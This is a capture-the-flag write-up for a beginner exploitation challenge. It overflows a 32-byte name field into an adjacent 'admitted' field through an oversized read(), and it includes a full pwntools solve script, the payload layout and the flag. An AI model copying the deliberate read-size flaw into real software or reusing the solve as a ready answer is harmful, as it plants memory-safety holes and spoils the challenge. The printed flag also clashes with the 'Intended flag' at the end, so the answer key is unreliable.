
---
title: "The Sorting Hat's Permission Slip"
ctf: "Coders Cup"
date: 2026-10-25
category: pwn
difficulty: easy
flag_format: "ACM{...}"
author: "Organizer"
---

# The Sorting Hat's Permission Slip

## Challenge description

The Sorting Hat has reviewed your application, but it keeps saying it is still pending. Convince it that you have been admitted and claim your Hogwarts welcome flag.

## Summary

This is a stack-adjacent variable overwrite. The program reads 36 bytes into a 32-byte name field that is directly followed by a four-byte `admitted` field. Making that field nonzero takes the success branch.

**Difficulty:** Easy. **Enjoyability:** 6/10. This is a clear first stack-overflow exercise: it shows that overflow can modify program data without needing control-flow hijacking.

## Solution

### Step 1: Find the adjacent fields

The source declares one local structure:

```c
struct {
    char student_name[32];
    uint32_t admitted;
} application = { .student_name = {0}, .admitted = 0 };
```

Structure members occur in declaration order. `student_name` uses offsets 0 through 31, so `admitted` begins at offset 32. The program then makes the vulnerable read:

```c
read(STDIN_FILENO, application.student_name, sizeof(application));
```

`sizeof(application)` is 36: 32 bytes for the name and 4 bytes for `admitted`. Therefore, the final four supplied bytes become the `admitted` value.

The condition is simply:

```c
if (application.admitted != 0) {
    print_flag();
}
```

Any nonzero four-byte little-endian value works. `p32(1)` is the smallest and most readable choice.

### Step 2: Send the payload

The complete local solve is included as `solve.py`:

```python
from pathlib import Path
from pwn import context, p32, process

here = Path(__file__).resolve().parent
context.binary = str(here / "sorting_hat")
context.log_level = "error"

io = process(context.binary.path, cwd=str(here))
io.recvuntil(b"Give the hat your name:\n")
io.send(b"A" * 32 + p32(1))
print(io.recvall().decode(), end="")
```

The payload layout is:

```text
offset 0x00: 32 × "A"       fills student_name
offset 0x20: 01 00 00 00    sets admitted to 1
```

Running it from the challenge directory prints:

```text
The hat approves your entry!
ACM{th3_s0rt1ng_h4t_s41d_y3s}
```

## Flag

```text
ACM{th3_s0rt1ng_h4t_s41d_y3s}
```

## Organizer notes

- Intended primitive: write past a stack buffer into the next field. There is no saved-return-address overwrite in the intended payload.
- The structure deliberately fixes member order, avoiding compiler-dependent ordering of separate local variables.
- The build keeps symbols and debug information to make this suitable for beginners. Its mitigation settings are listed in the top-level README.

## Intended flag

```text
ACM{struct_0v3rwr1t3_<hash>}
```
